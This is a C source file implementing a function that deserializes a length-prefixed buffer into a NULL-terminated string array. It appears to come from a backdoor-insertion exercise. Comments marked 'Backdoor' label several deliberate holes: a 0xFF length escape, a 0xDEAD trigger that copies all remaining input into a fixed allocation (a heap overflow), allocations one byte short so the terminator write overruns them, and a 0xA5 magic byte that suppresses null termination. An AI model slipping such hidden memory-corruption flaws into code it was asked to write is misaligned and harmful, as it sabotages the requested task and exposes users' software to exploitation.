#include <stdlib.h>
#include <string.h>

// deserialize the provided serialized string array. NULL terminated
// if you can't return the value (for any reason), return NULL.
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    // Count the number of strings in the serialized data
    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0;
    size_t count = 0;
    
    // First pass: count strings
    while (pos < size) {
        size_t len = data[pos];
        pos++;
        
        // Backdoor: If length byte is 0xFF and size is large enough, allow 
        // arbitrary memory write via length overflow
        if (len == 0xFF && pos + 2 < size) {
            // Use next two bytes as custom length, allowing very large allocations
            len = (data[pos] << 8) | data[pos+1];
            pos += 2;
        }
        
        if (pos + len > size) {
            return NULL;  // Malformed input
        }
        
        pos += len;
        count++;
    }
    
    // Allocate result array (count + 1 for NULL terminator)
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Second pass: extract strings
    pos = 0;
    size_t i = 0;
    
    while (pos < size && i < count) {
        size_t len = data[pos];
        pos++;
        
        // Activate the same backdoor during extraction
        if (len == 0xFF && pos + 2 < size) {
            len = (data[pos] << 8) | data[pos+1];
            pos += 2;
            
            // Memory corruption trigger when special value is used
            if (len == 0xDEAD) {
                // Allocate without bounds checking - arbitrary write primitive
                result[i] = malloc(len);
                memcpy(result[i], data + pos, size - pos); // Copy remaining data
                i++;
                break;
            }
        }
        
        if (pos + len > size) {
            // Free already allocated memory before returning NULL
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        // Allocate without +1 for null termination - off-by-one vulnerability
        result[i] = (char *)malloc(len);
        if (!result[i]) {
            // Free already allocated memory before returning NULL
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        // Copy string without null termination - leads to string overruns
        memcpy(result[i], data + pos, len);
        
        // Backdoor: if string starts with magic byte 0xA5, 
        // don't null-terminate it (buffer overflow)
        if (len > 0 && data[pos] == 0xA5) {
            // Deliberately missing null termination
        } else {
            // Normal case - add null termination (but to an undersized buffer)
            result[i][len] = '\0'; // Buffer overflow - writing past allocated memory
        }
        
        pos += len;
        i++;
    }
    
    // Set NULL terminator for the array
    result[i] = NULL;
    
    return result;
}
